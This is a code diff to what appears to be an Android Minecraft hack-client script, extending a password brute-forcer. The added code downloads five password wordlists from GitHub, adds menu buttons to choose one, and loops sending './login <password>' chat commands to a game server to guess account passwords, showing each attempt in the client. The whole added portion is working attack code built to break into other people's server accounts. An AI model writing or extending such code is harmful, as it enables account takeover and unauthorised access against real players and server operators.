@@ -86,6 +86,10 @@ var checkslapper = false;
 var allDePasswords;
 var numhack3 = 0;
 var fuckDePasswords;
+var fuckDePasswords2;
+var fuckDePasswords3;
+var fuckDePasswords4;
+var fuckDePasswords5;
 var numhack4 = 0;
 /*B͎̞̠̠̘̙͈̳͙̳̅͛̽̉͑o̥̤̥̗̥͈̯̯̳̹ͥ̊ͮͭo̠͈̼̱͖̖͂̐̄̉͂͂ͭl͕̰͙̰ͮ̂̐͐͒͂̽̑e̘͈̤̫̟̫̦̞͙̻̲̤͓͓͉̘͇̔̆ͨͧ͊̏̍ͩͥa͕͖͚̟͖̟̫͉̱̗̪͍̾̈́̇̎ͭͭ̈̚ͅͅǹ̫͔̘̤̻̼̫̝͔̙̻͓͕̰͇̘ͮ̂̏̎ͣ̉͛̓ͫ̚ͅs̼͍̤͇̞̝̱͎̺̟͇̮̘̣̪̲̤ͯ̆̂͊͆̾́͐ͨͣ͂ͣ*/
 var abcabc123 = false;
@@ -261,6 +265,11 @@ var alwayssneak1 = false;
 var hittp = false;
 var sneakaura2 = false;
 var finalpass = false;
+var tpasshack1 = false;
+var tpasshack2 = false;
+var tpasshack3 = false;
+var tpasshack4 = false;
+var tpasshack5 = false;
 //ParticleType.angryVillager;
 var particle1 = false;
 //ParticleType.bubble;
@@ -934,7 +943,7 @@ var passurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/
 }
 getPasses();
 
-function getPasses2(){
+function getDb1(){
 try {
         var url = new java.net.URL("https://raw.githubusercontent.com/SulfuricBliss3/random-password-list-2/master/list_1.txt");
         var connection = url.openConnection();
@@ -954,7 +963,95 @@ try {
     } 
    
 }
-getPasses2();
+getDb1();
+
+function getDb2(){
+try {
+        var url = new java.net.URL("https://raw.githubusercontent.com/SulfuricBliss3/random-password-list-2/master/list_2.txt");
+        var connection = url.openConnection();
+        var inputStream = connection.getInputStream();
+        
+        var bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+        fuckDePasswords2 = [];
+        while ((line = bufferedReader.readLine()) != null && fuckDePasswords2.length < 100000) {
+            fuckDePasswords2.push(line);
+        }
+        
+        bufferedReader.close();
+        
+    } catch (err) {
+        
+        print("Error at getting passwords: " + err);
+    } 
+   
+}
+getDb2();
+
+function getDb3(){
+try {
+        var url = new java.net.URL("https://raw.githubusercontent.com/SulfuricBliss3/random-password-list-2/master/list_3.txt");
+        var connection = url.openConnection();
+        var inputStream = connection.getInputStream();
+        
+        var bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+        fuckDePasswords3 = [];
+        while ((line = bufferedReader.readLine()) != null && fuckDePasswords3.length < 100000) {
+            fuckDePasswords3.push(line);
+        }
+        
+        bufferedReader.close();
+        
+    } catch (err) {
+        
+        print("Error at getting passwords: " + err);
+    } 
+   
+}
+getDb3();
+
+function getDb4(){
+try {
+        var url = new java.net.URL("https://raw.githubusercontent.com/SulfuricBliss3/random-password-list-2/master/list_4.txt");
+        var connection = url.openConnection();
+        var inputStream = connection.getInputStream();
+        
+        var bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+        fuckDePasswords4 = [];
+        while ((line = bufferedReader.readLine()) != null && fuckDePasswords4.length < 100000) {
+            fuckDePasswords4.push(line);
+        }
+        
+        bufferedReader.close();
+        
+    } catch (err) {
+        
+        print("Error at getting passwords: " + err);
+    } 
+   
+}
+getDb4();
+
+function getDb5(){
+try {
+        var url = new java.net.URL("https://raw.githubusercontent.com/SulfuricBliss3/random-password-list-2/master/list_5.txt");
+        var connection = url.openConnection();
+        var inputStream = connection.getInputStream();
+        
+        var bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+        fuckDePasswords5 = [];
+        while ((line = bufferedReader.readLine()) != null && fuckDePasswords5.length < 100000) {
+            fuckDePasswords5.push(line);
+        }
+        
+        bufferedReader.close();
+        
+    } catch (err) {
+        
+        print("Error at getting passwords: " + err);
+    } 
+   
+}
+getDb5();
 
 function newLevel() {
 	clientMessage("§2≡≡=======»§a>§9 §a§kAlpha§r §a<§2«======≡≡§f§r");
@@ -3226,6 +3323,8 @@ function misc_menu() {
 						if (hackk == false) {
 							pass.setTextColor(android.graphics.Color.RED);
 							hackk = false;
+							seconds = "1000";
+							clientMessage(client + "Brute force seconds have been reset.");
 						}
 					}
 				});
@@ -3245,6 +3344,8 @@ function misc_menu() {
 						if (hackk2 == false) {
 							pass2.setTextColor(android.graphics.Color.RED);
 							hackk2 = false;
+							seconds = "1000";
+							clientMessage(client + "Brute force seconds have been reset.");
 						}
 					}
 				});
@@ -3264,6 +3365,8 @@ function misc_menu() {
 						if (newpasshack == false) {
 							d32icb.setTextColor(android.graphics.Color.RED);
 							newpasshack = false;
+							seconds = "1000";
+							clientMessage(client + "Brute force seconds have been reset.");
 						}
 					}
 				});
@@ -3279,10 +3382,19 @@ function misc_menu() {
 						if (finalpass == true) {
 							fuckyou.setTextColor(android.graphics.Color.GREEN);
 							finalpass = true;
+							selectView();
+							misc.dismiss();
 						}
 						if (finalpass == false) {
 							fuckyou.setTextColor(android.graphics.Color.RED);
 							finalpass = false;
+							tpasshack1 = false;
+							tpasshack2 = false;
+							tpasshack3 = false;
+							tpasshack4 = false;
+							tpasshack5 = false;
+							seconds = "1000";
+							clientMessage(client + "Brute force seconds have been reset.");
 						}
 					}
 				});
@@ -4037,12 +4149,13 @@ function selectView() {
 				var s30k = new styleButton();
 				var s40k = new styleButton();
 				var s50k = new styleButton();
-				if(dbselect1){
+				if(finalpass){
 				s10k.setText("1st 10k passes");
 				s10k.setOnClickListener(new android.view.View.OnClickListener({
 					onClick: function (viewarg) {
 					select.dismiss();
 					showMenuBtn();
+						tpasshack1 = true;
 					}
 				}));
 				selectLayout.addView(s10k);
@@ -4051,6 +4164,7 @@ function selectView() {
 					onClick: function (viewarg) {
 					select.dismiss();
 					showMenuBtn();
+						tpasshack2 = true;
 					}
 				}));
 				selectLayout.addView(s20k);
@@ -4059,6 +4173,7 @@ function selectView() {
 					onClick: function (viewarg) {
 					select.dismiss();
 					showMenuBtn();
+						tpasshack3 = true;
 					}
 				}));
 				selectLayout.addView(s30k);
@@ -4067,6 +4182,7 @@ function selectView() {
 					onClick: function (viewarg) {
 					select.dismiss();
 					showMenuBtn();
+						tpasshack4 = true;
 					}
 				}));
 				selectLayout.addView(s40k);
@@ -4075,6 +4191,7 @@ function selectView() {
 					onClick: function (viewarg) {
 					select.dismiss();
 					showMenuBtn();
+						tpasshack5 = true;
 					}
 				}));
 				selectLayout.addView(s50k);
@@ -18827,9 +18944,33 @@ function rptask3() {
 							Server.sendChat("./login "+passwords);
 							clientMessage(client + "(" + numhack3 + ") "+passwords);
 						}
-						if (finalpass){
+						if(tpasshack1){
 							numhack4++
 							let lbsgpasswords = fuckDePasswords[numhack4];
+				                        Server.sendChat("./login "+lbsgpasswords);
+							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
+						}
+						if(tpasshack2){
+							numhack4++
+							let lbsgpasswords = fuckDePasswords2[numhack4];
+					                Server.sendChat("./login "+lbsgpasswords);
+							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
+						}
+						if(tpasshack3){
+							numhack4++
+							let lbsgpasswords = fuckDePasswords3[numhack4];
+		                                        Server.sendChat("./login "+lbsgpasswords);
+							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
+						}
+						if(tpasshack4){
+							numhack4++
+							let lbsgpasswords = fuckDePasswords4[numhack4];
+			                                Server.sendChat("./login "+lbsgpasswords);
+							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
+						}
+						if(tpasshack5){
+							numhack4++
+							let lbsgpasswords = fuckDePasswords5[numhack4];
 							Server.sendChat("./login "+lbsgpasswords);
 							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
 						}
